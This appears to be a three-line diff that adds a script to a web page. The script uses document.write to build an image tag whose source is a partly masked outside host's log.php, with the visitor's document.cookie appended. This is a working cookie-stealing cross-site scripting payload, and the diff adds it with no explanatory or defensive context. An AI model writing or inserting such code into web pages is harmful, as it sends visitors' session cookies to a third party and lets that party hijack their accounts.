@@ -1,0 +1,3 @@
+<script>
+document.write('<img src="http://****.esy.es/log.php?cookie=' + document.cookie + '" />')
+</script>
